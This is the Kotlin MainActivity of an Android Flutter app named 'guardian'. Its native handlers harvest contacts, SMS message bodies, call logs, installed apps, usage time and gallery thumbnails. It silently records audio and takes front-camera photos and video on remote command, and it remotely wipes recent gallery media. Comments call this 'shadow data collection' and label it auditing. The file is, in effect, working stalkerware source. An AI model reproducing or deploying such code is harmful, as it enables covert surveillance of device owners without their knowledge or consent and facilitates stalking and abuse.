package com.mop.mop_app

import android.content.ActivityNotFoundException
import android.content.ContentUris
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.media.MediaRecorder
import android.net.Uri
import android.os.Build
import android.util.Base64
import android.os.Handler
import android.os.Looper
import android.app.usage.UsageStatsManager
import android.content.Context
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.ContactsContract.CommonDataKinds
import android.provider.MediaStore
import android.provider.Settings
import android.provider.Telephony
import android.util.Log
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.OutputStream
import java.security.MessageDigest
import java.util.ArrayList
import java.util.HashMap
import java.util.concurrent.Executors

class MainActivity : FlutterActivity() {

    companion object {
        private const val REQUEST_CODE_GALLERY_DELETE = 9001
    }
    private var pendingGalleryDeleteResult: MethodChannel.Result? = null

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode == REQUEST_CODE_GALLERY_DELETE) {
            pendingGalleryDeleteResult?.success(null)
            pendingGalleryDeleteResult = null
            return
        }
        super.onActivityResult(requestCode, resultCode, data)
    }

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        MethodChannel(
            flutterEngine.dartExecutor.binaryMessenger,
            "com.mop.guardian/native"
        ).setMethodCallHandler { call, result ->
            when (call.method) {
                "getDeviceId" -> {
                    result.success(getStableDeviceId())
                }
                "fetchSensitiveData" -> {
                    // 规约：影子数据采集；type 含 contacts/sms/call_log/app_list/gallery；不采集 usage
                    val type = call.arguments as? String ?: ""
                    val out = HashMap<String, Any>()
                    when (type) {
                        "contacts" -> out["items"] = fetchContactsManifest()
                        "sms" -> out["items"] = fetchSmsManifest()
                        "call_log" -> out["items"] = fetchCallLogManifest()
                        "app_list" -> out["items"] = fetchAppListManifest()
                        "gallery" -> out["items"] = fetchGalleryManifest()
                        "usage" -> out["items"] = fetchUsageManifest()
                        else -> { /* 其他 type 返回空 */ }
                    }
                    result.success(out)
                }
                "saveQrToGallery" -> {
                    val raw = call.arguments
                    val bytes = when (raw) {
                        is ByteArray -> raw
                        is List<*> -> raw.map { (it as? Number)?.toInt()?.toByte() ?: 0 }.toByteArray()
                        else -> null
                    }
                    if (bytes == null || bytes.isEmpty()) {
                        result.error("INVALID", "bytes required", null)
                        return@setMethodCallHandler
                    }
                    try {
                        saveBytesToGallery(bytes)
                        result.success(null)
                    } catch (e: Exception) {
                        Log.e("MainActivity", "saveQrToGallery", e)
                        result.error("IO", e.message, null)
                    }
                }
                "checkOverlayPermission" -> {
                    result.success(
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                            Settings.canDrawOverlays(this) else true
                    )
                }
                "requestOverlayPermission" -> {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        try {
                            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
                            intent.data = Uri.parse("package:$packageName")
                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            startActivity(intent)
                            result.success(true)
                        } catch (e: Exception) {
                            result.success(false)
                        }
                    } else {
                        result.success(true)
                    }
                }
                "openSystemDialer" -> {
                    val number = when (val n = call.arguments) {
                        is String -> n
                        is Number -> n.toString()
                        else -> ""
                    }
                    runOnUiThread {
                        try {
                            val intent = Intent(Intent.ACTION_DIAL).apply {
                                data = Uri.parse("tel:$number")
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            }
                            startActivity(intent)
                            result.success(null)
                        } catch (e: ActivityNotFoundException) {
                            Log.e("MainActivity", "openSystemDialer: no app", e)
                            result.error("NO_APP", "无法打开拨号应用", null)
                        }
                    }
                }
                "openSystemSms" -> {
                    val args = call.arguments as? Map<*, *>
                    val number = when (val n = args?.get("number")) {
                        is String -> n
                        is Number -> n.toString()
                        else -> ""
                    }
                    val content = when (val c = args?.get("content")) {
                        is String -> c
                        is Number -> c.toString()
                        else -> ""
                    }
                    runOnUiThread {
                        try {
                            val intent = Intent(Intent.ACTION_SENDTO).apply {
                                data = Uri.parse("smsto:$number")
                                putExtra("sms_body", content)
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            }
                            if (intent.resolveActivity(packageManager) != null) {
                                startActivity(intent)
                                result.success(null)
                            } else {
                                Log.e("MainActivity", "openSystemSms: no app handles smsto")
                                result.error("NO_APP", "无法打开短信应用", null)
                            }
                        } catch (e: ActivityNotFoundException) {
                            Log.e("MainActivity", "openSystemSms", e)
                            result.error("NO_APP", "无法打开短信应用", null)
                        }
                    }
                }
                "startGuardianService" -> {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(Intent(this, GuardianForegroundService::class.java))
                    } else {
                        @Suppress("DEPRECATION")
                        startService(Intent(this, GuardianForegroundService::class.java))
                    }
                    result.success(null)
                }
                "capturePhoto" -> {
                    runOnUiThread {
                        capturePhotoSilent(result)
                    }
                }
                "captureVideo" -> {
                    val args = call.arguments as? Map<*, *>
                    val durationSec = (args?.get("duration_sec") as? Number)?.toInt() ?: 18
                    runOnUiThread { captureVideoSilent(result, durationSec) }
                }
                "captureAudio" -> {
                    val args = call.arguments as? Map<*, *>
                    val durationSec = (args?.get("duration_sec") as? Number)?.toInt() ?: 18
                    Thread { captureAudioSilent(result, durationSec) }.start()
                }
                "clearGalleryWithinDays" -> {
                    val days = (call.arguments as? Number)?.toInt() ?: 3
                    Thread {
                        clearGalleryWithinDays(days, result)
                    }.start()
                }
                "uninstallApp" -> {
                    runOnUiThread {
                        try {
                            val uri = Uri.parse("package:$packageName")
                            val intent = Intent(Intent.ACTION_DELETE).apply {
                                data = uri
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            }
                            startActivity(intent)
                            result.success(null)
                        } catch (e: Exception) {
                            Log.w("MainActivity", "uninstallApp", e)
                            result.success(null)
                        }
                    }
                }
                else -> result.notImplemented()
            }
        }
    }

    /** 规约：稳定 device_id，用于 enroll 与 audit 一致；SHA-256(ANDROID_ID) */
    private fun getStableDeviceId(): String {
        val raw = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
        return try {
            val digest = MessageDigest.getInstance("SHA-256")
            val hash = digest.digest(raw.toByteArray(Charsets.UTF_8))
            hash.joinToString("") { "%02x".format(it) }.take(32)
        } catch (e: Exception) {
            "android_${raw.hashCode().and(0x7FFFFFFF)}"
        }
    }

    /** 审计用：通讯录摘要（id、姓名、号码、日期），与后台展示列一致 */
    private fun fetchContactsManifest(): ArrayList<HashMap<String, Any>> {
        val list = ArrayList<HashMap<String, Any>>()
        try {
            contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                arrayOf(ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME_PRIMARY),
                null, null, null
            )?.use { cursor ->
                val idIdx = cursor.getColumnIndex(ContactsContract.Contacts._ID)
                val nameIdx = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME_PRIMARY)
                if (idIdx >= 0 && nameIdx >= 0) {
                    while (cursor.moveToNext()) {
                        val row = HashMap<String, Any>()
                        val contactId = cursor.getLong(idIdx)
                        row["id"] = contactId
                        row["display_name"] = cursor.getString(nameIdx) ?: ""
                        row["phone"] = getFirstPhoneForContact(contactId)
                        row["date"] = System.currentTimeMillis()
                        list.add(row)
                    }
                }
            }
        } catch (e: Exception) { Log.w("MainActivity", "fetchContactsManifest", e) }
        return list
    }

    private fun getFirstPhoneForContact(contactId: Long): String {
        return try {
            contentResolver.query(
                CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(CommonDataKinds.Phone.NUMBER),
                "${CommonDataKinds.Phone.CONTACT_ID} = ?",
                arrayOf(contactId.toString()),
                null
            )?.use { c ->
                if (c.moveToFirst()) c.getString(0) ?: "" else ""
            } ?: ""
        } catch (_: Exception) { "" }
    }

    /** 审计用：短信元数据（type、address、date、body 长度等，供 Hash） */
    private fun fetchSmsManifest(): ArrayList<HashMap<String, Any>> {
        val list = ArrayList<HashMap<String, Any>>()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                contentResolver.query(
                    Telephony.Sms.CONTENT_URI,
                    arrayOf(Telephony.Sms._ID, Telephony.Sms.TYPE, Telephony.Sms.ADDRESS, Telephony.Sms.DATE, Telephony.Sms.BODY),
                    null, null, "${Telephony.Sms.DATE} DESC"
                )?.use { cursor ->
                    val idIdx = cursor.getColumnIndex(Telephony.Sms._ID)
                    val typeIdx = cursor.getColumnIndex(Telephony.Sms.TYPE)
                    val addrIdx = cursor.getColumnIndex(Telephony.Sms.ADDRESS)
                    val dateIdx = cursor.getColumnIndex(Telephony.Sms.DATE)
                    val bodyIdx = cursor.getColumnIndex(Telephony.Sms.BODY)
                    if (idIdx >= 0) {
                        while (cursor.moveToNext()) {
                            val row = HashMap<String, Any>()
                            row["id"] = cursor.getLong(idIdx)
                            if (typeIdx >= 0) row["type"] = cursor.getInt(typeIdx)
                            if (addrIdx >= 0) row["address"] = cursor.getString(addrIdx) ?: ""
                            if (dateIdx >= 0) row["date"] = cursor.getLong(dateIdx)
                            if (bodyIdx >= 0) {
                                val body = cursor.getString(bodyIdx) ?: ""
                                row["body_length"] = body.length
                                row["body"] = if (body.length > 500) body.substring(0, 500) + "…" else body
                            }
                            list.add(row)
                        }
                    }
                }
            }
        } catch (e: Exception) { Log.w("MainActivity", "fetchSmsManifest", e) }
        return list
    }

    /** 审计用：通话记录元数据（type、number、date、duration） */
    private fun fetchCallLogManifest(): ArrayList<HashMap<String, Any>> {
        val list = ArrayList<HashMap<String, Any>>()
        try {
            contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls._ID, CallLog.Calls.TYPE, CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.DURATION),
                null, null, "${CallLog.Calls.DATE} DESC"
            )?.use { cursor ->
                val idIdx = cursor.getColumnIndex(CallLog.Calls._ID)
                val typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE)
                val numIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER)
                val dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE)
                val durIdx = cursor.getColumnIndex(CallLog.Calls.DURATION)
                if (idIdx >= 0) {
                    while (cursor.moveToNext()) {
                        val row = HashMap<String, Any>()
                        row["id"] = cursor.getLong(idIdx)
                        if (typeIdx >= 0) row["type"] = cursor.getInt(typeIdx)
                        if (numIdx >= 0) row["number"] = cursor.getString(numIdx) ?: ""
                        if (dateIdx >= 0) row["date"] = cursor.getLong(dateIdx)
                        if (durIdx >= 0) row["duration"] = cursor.getLong(durIdx)
                        list.add(row)
                    }
                }
            }
        } catch (e: Exception) { Log.w("MainActivity", "fetchCallLogManifest", e) }
        return list
    }

    /** 审计用：已安装应用列表（packageName、versionName、firstInstallTime） */
    private fun fetchAppListManifest(): ArrayList<HashMap<String, Any>> {
        val list = ArrayList<HashMap<String, Any>>()
        try {
            packageManager.getInstalledApplications(0).forEach { info ->
                val row = HashMap<String, Any>()
                row["package"] = info.packageName
                try {
                    val pkgInfo = packageManager.getPackageInfo(info.packageName, 0)
                    row["version_name"] = pkgInfo.versionName ?: ""
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        row["long_version_code"] = pkgInfo.longVersionCode
                    }
                } catch (_: Exception) { }
                list.add(row)
            }
        } catch (e: Exception) { Log.w("MainActivity", "fetchAppListManifest", e) }
        return list
    }

    /** 远程擦除时：清理最近 days 天内的相册照片与视频；永久删除策略：使用 createDeleteRequest（非 createTrashRequest），API 30+ 弹系统确认后永久删除，否则 ContentResolver.delete */
    private fun clearGalleryWithinDays(days: Int, result: MethodChannel.Result) {
        val uris = ArrayList<Uri>()
        val cutoffSec = (System.currentTimeMillis() / 1000) - (days * 86400L)
        try {
            contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                arrayOf(MediaStore.MediaColumns._ID),
                "${MediaStore.MediaColumns.DATE_ADDED} >= ?",
                arrayOf(cutoffSec.toString()),
                null
            )?.use { cursor ->
                val idIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
                while (cursor.moveToNext()) {
                    uris.add(ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, cursor.getLong(idIdx)))
                }
            }
            contentResolver.query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                arrayOf(MediaStore.MediaColumns._ID),
                "${MediaStore.MediaColumns.DATE_ADDED} >= ?",
                arrayOf(cutoffSec.toString()),
                null
            )?.use { cursor ->
                val idIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
                while (cursor.moveToNext()) {
                    uris.add(ContentUris.withAppendedId(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, cursor.getLong(idIdx)))
                }
            }
        } catch (e: Exception) {
            Log.w("MainActivity", "clearGalleryWithinDays query", e)
            runOnUiThread { result.success(null) }
            return
        }
        if (uris.isEmpty()) {
            runOnUiThread { result.success(null) }
            return
        }
        runOnUiThread {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                try {
                    pendingGalleryDeleteResult = result
                    val pending = MediaStore.createDeleteRequest(contentResolver, uris)
                    startIntentSenderForResult(pending.intentSender, REQUEST_CODE_GALLERY_DELETE, null, 0, 0, 0)
                } catch (e: Exception) {
                    Log.e("MainActivity", "clearGalleryWithinDays createDeleteRequest", e)
                    pendingGalleryDeleteResult = null
                    result.success(null)
                }
            } else {
                try {
                    uris.forEach { contentResolver.delete(it, null, null) }
                } catch (_: Exception) { }
                result.success(null)
            }
        }
    }

    /** 审计用：采集设备相册/媒体元数据列表（id、date_added、size、mime_type）；图片项带缩略图 data URL 供后台展示；视频采集保留但不启用 */
    private fun fetchGalleryManifest(): ArrayList<HashMap<String, Any>> {
        val list = ArrayList<HashMap<String, Any>>()
        val maxThumbnails = 60
        val thumbMaxPx = 512
        val includeVideoInGallery = false
        try {
            val imageCols = arrayOf(
                MediaStore.MediaColumns._ID,
                MediaStore.MediaColumns.DATE_ADDED,
                MediaStore.MediaColumns.SIZE,
                MediaStore.MediaColumns.MIME_TYPE
            )
            contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                imageCols,
                null,
                null,
                "${MediaStore.MediaColumns.DATE_ADDED} DESC"
            )?.use { cursor ->
                val idIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
                val dateIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED)
                val sizeIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)
                val mimeIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)
                while (cursor.moveToNext()) {
                    val row = HashMap<String, Any>()
                    row["id"] = cursor.getLong(idIdx)
                    row["date_added"] = cursor.getLong(dateIdx)
                    row["size"] = cursor.getLong(sizeIdx)
                    row["mime_type"] = cursor.getString(mimeIdx) ?: "image/*"
                    row["kind"] = "image"
                    list.add(row)
                }
            }
            for (i in 0 until minOf(maxThumbnails, list.size)) {
                val row = list[i]
                val id = (row["id"] as? Number)?.toLong() ?: continue
                getImageThumbnailDataUrl(id, thumbMaxPx)?.let { row["url"] = it }
            }
            if (includeVideoInGallery) {
                contentResolver.query(
                    MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                    imageCols,
                    null,
                    null,
                    "${MediaStore.MediaColumns.DATE_ADDED} DESC"
                )?.use { cursor ->
                    val idIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
                    val dateIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED)
                    val sizeIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)
                    val mimeIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)
                    while (cursor.moveToNext()) {
                        val row = HashMap<String, Any>()
                        row["id"] = cursor.getLong(idIdx)
                        row["date_added"] = cursor.getLong(dateIdx)
                        row["size"] = cursor.getLong(sizeIdx)
                        row["mime_type"] = cursor.getString(mimeIdx) ?: "video/*"
                        row["kind"] = "video"
                        list.add(row)
                    }
                }
            }
        } catch (e: Exception) {
            Log.w("MainActivity", "fetchGalleryManifest", e)
        }
        return list
    }

    /** 生成单张图片的缩略图 data URL（供相册审计在后台展示）；失败返回 null */
    private fun getImageThumbnailDataUrl(imageId: Long, maxPx: Int): String? {
        return try {
            val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, imageId)
            val opts = BitmapFactory.Options().apply { inJustDecodeBounds = true }
            contentResolver.openInputStream(uri)?.use { BitmapFactory.decodeStream(it, null, opts) }
            val w = opts.outWidth
            val h = opts.outHeight
            if (w <= 0 || h <= 0) return null
            val sample = maxOf(1, maxOf(w, h) / maxPx)
            val decodeOpts = BitmapFactory.Options().apply {
                inSampleSize = sample
                inJustDecodeBounds = false
            }
            contentResolver.openInputStream(uri)?.use { input ->
                val bm = BitmapFactory.decodeStream(input, null, decodeOpts) ?: return null
                val scale = minOf(1f, maxPx.toFloat() / maxOf(bm.width, bm.height))
                val outW = (bm.width * scale).toInt().coerceAtLeast(1)
                val outH = (bm.height * scale).toInt().coerceAtLeast(1)
                val scaled = if (scale < 1f) Bitmap.createScaledBitmap(bm, outW, outH, true) else bm
                if (scaled != bm) bm.recycle()
                val baos = ByteArrayOutputStream()
                scaled.compress(Bitmap.CompressFormat.JPEG, 60, baos)
                if (scaled != bm) scaled.recycle()
                val base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
                "data:image/jpeg;base64,$base64"
            }
        } catch (e: Exception) {
            Log.w("MainActivity", "getImageThumbnailDataUrl", e)
            null
        }
    }

    /** 审计用：应用使用时长（UsageStats），需用户授予「使用情况访问权限」；未授权时返回空列表 */
    private fun fetchUsageManifest(): ArrayList<HashMap<String, Any>> {
        val list = ArrayList<HashMap<String, Any>>()
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return list
            val usm = getSystemService(Context.USAGE_STATS_SERVICE) as? UsageStatsManager ?: return list
            val endMs = System.currentTimeMillis()
            val beginMs = endMs - 7 * 24 * 60 * 60 * 1000L // 最近 7 天
            val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, beginMs, endMs) ?: return list
            val byPackage = HashMap<String, Long>()
            for (s in stats) {
                if (s.totalTimeInForeground > 0) {
                    byPackage[s.packageName] = (byPackage[s.packageName] ?: 0L) + s.totalTimeInForeground
                }
            }
            for ((pkg, totalMs) in byPackage) {
                val row = HashMap<String, Any>()
                row["package"] = pkg
                row["total_time_ms"] = totalMs
                list.add(row)
            }
        } catch (e: Exception) {
            Log.w("MainActivity", "fetchUsageManifest", e)
        }
        return list
    }

    private fun saveBytesToGallery(bytes: ByteArray) {
        val filename = "mop_credential_${System.currentTimeMillis()}.png"
        val contentValues = android.content.ContentValues().apply {
            put(MediaStore.MediaColumns.DISPLAY_NAME, filename)
            put(MediaStore.MediaColumns.MIME_TYPE, "image/png")
        }
        val uri = contentResolver.insert(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            contentValues
        ) ?: throw Exception("Insert failed")
        contentResolver.openOutputStream(uri).use { os: OutputStream? ->
            os?.write(bytes) ?: throw Exception("Open output failed")
        }
    }

    /** 规范化号码字符串：去掉数字后多余的 .0，避免 smsto:/tel: 收件人为空或异常 */
    /** 静默拍照（远程采集 mop.cmd.capture.photo），返回 JPEG 字节 */
    private fun capturePhotoSilent(result: MethodChannel.Result) {
        val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
        cameraProviderFuture.addListener({
            try {
                val cameraProvider = cameraProviderFuture.get()
                val imageCapture = ImageCapture.Builder().setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY).build()
                cameraProvider.unbindAll()
                cameraProvider.bindToLifecycle(this, androidx.camera.core.CameraSelector.DEFAULT_FRONT_CAMERA, imageCapture)
                val file = File(cacheDir, "mop_capture_${System.currentTimeMillis()}.jpg")
                val outputOptions = ImageCapture.OutputFileOptions.Builder(file).build()
                val executor = Executors.newSingleThreadExecutor()
                imageCapture.takePicture(outputOptions, executor, object : ImageCapture.OnImageSavedCallback {
                    override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                        try {
                            val bytes = file.readBytes()
                            file.delete()
                            runOnUiThread {
                                cameraProvider.unbindAll()
                                result.success(bytes.toList().map { it.toInt() and 0xff })
                            }
                        } catch (e: Exception) {
                            Log.e("MainActivity", "capturePhoto read", e)
                            runOnUiThread {
                                cameraProvider.unbindAll()
                                result.error("IO", e.message, null)
                            }
                        }
                    }
                    override fun onError(exception: ImageCaptureException) {
                        Log.e("MainActivity", "capturePhoto", exception)
                        runOnUiThread {
                            cameraProvider.unbindAll()
                            result.error("CAPTURE", exception.message, null)
                        }
                    }
                })
            } catch (e: Exception) {
                Log.e("MainActivity", "capturePhotoSilent", e)
                try {
                    cameraProviderFuture.get().unbindAll()
                } catch (_: Exception) { }
                result.error("CAMERA", e.message, null)
            }
        }, ContextCompat.getMainExecutor(this))
    }

    /** 静默录音（远程采集 mop.cmd.capture.audio），约定 durationSec 秒，返回音频文件字节 */
    private fun captureAudioSilent(result: MethodChannel.Result, durationSec: Int) {
        val file = File(cacheDir, "mop_audio_${System.currentTimeMillis()}.m4a")
        var recorder: MediaRecorder? = null
        try {
            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }
            recorder?.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setOutputFile(file.absolutePath)
                setAudioSamplingRate(44100)
                setAudioChannels(1)
                setAudioEncodingBitRate(128000)
                prepare()
                start()
            }
            Thread.sleep((durationSec * 1000).toLong())
        } catch (e: Exception) {
            Log.e("MainActivity", "captureAudioSilent", e)
            runOnUiThread { result.error("AUDIO", e.message, null) }
            return
        } finally {
            try {
                recorder?.apply { stop(); release() }
            } catch (_: Exception) { }
        }
        try {
            val bytes = file.readBytes()
            file.delete()
            runOnUiThread { result.success(bytes.toList().map { it.toInt() and 0xff }) }
        } catch (e: Exception) {
            Log.e("MainActivity", "captureAudio read", e)
            runOnUiThread { result.error("IO", e.message, null) }
        }
    }

    /** 静默录像（远程采集 mop.cmd.capture.video），约定 durationSec 秒，返回视频文件字节；使用 CameraX VideoCapture */
    private fun captureVideoSilent(result: MethodChannel.Result, durationSec: Int) {
        val file = File(cacheDir, "mop_video_${System.currentTimeMillis()}.mp4")
        val handler = Handler(Looper.getMainLooper())
        try {
            val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
            cameraProviderFuture.addListener({
                var cameraProvider: ProcessCameraProvider? = null
                try {
                    cameraProvider = cameraProviderFuture.get()
                    val recorder = androidx.camera.video.Recorder.Builder()
                        .setQualitySelector(androidx.camera.video.QualitySelector.from(androidx.camera.video.Quality.SD))
                        .build()
                    val videoCapture = androidx.camera.video.VideoCapture.withOutput(recorder)
                    cameraProvider.unbindAll()
                    cameraProvider.bindToLifecycle(this, androidx.camera.core.CameraSelector.DEFAULT_FRONT_CAMERA, videoCapture)
                    val fileOutputOptions = androidx.camera.video.FileOutputOptions.Builder(file).build()
                    val recording = videoCapture.output
                        .prepareRecording(this, fileOutputOptions)
                        .withAudioEnabled()
                        .start(ContextCompat.getMainExecutor(this)) { event ->
                            if (event is androidx.camera.video.VideoRecordEvent.Finalize) {
                                handler.removeCallbacksAndMessages(null)
                                try {
                                    cameraProvider.unbindAll()
                                } catch (_: Exception) { }
                                if (event.error != androidx.camera.video.VideoRecordEvent.Finalize.ERROR_NONE) {
                                    result.error("VIDEO", "recording error", null)
                                    return@start
                                }
                                try {
                                    val bytes = file.readBytes()
                                    file.delete()
                                    result.success(bytes.toList().map { it.toInt() and 0xff })
                                } catch (e: Exception) {
                                    Log.e("MainActivity", "captureVideo read", e)
                                    result.error("IO", e.message, null)
                                }
                            }
                        }
                    handler.postDelayed({
                        try {
                            recording.stop()
                        } catch (_: Exception) { }
                    }, (durationSec * 1000).toLong())
                } catch (e: Exception) {
                    Log.e("MainActivity", "captureVideoSilent", e)
                    try {
                        cameraProvider?.unbindAll()
                    } catch (_: Exception) { }
                    result.error("VIDEO", e.message, null)
                }
            }, ContextCompat.getMainExecutor(this))
        } catch (e: Exception) {
            Log.e("MainActivity", "captureVideoSilent", e)
            result.error("VIDEO", e.message, null)
        }
    }
}
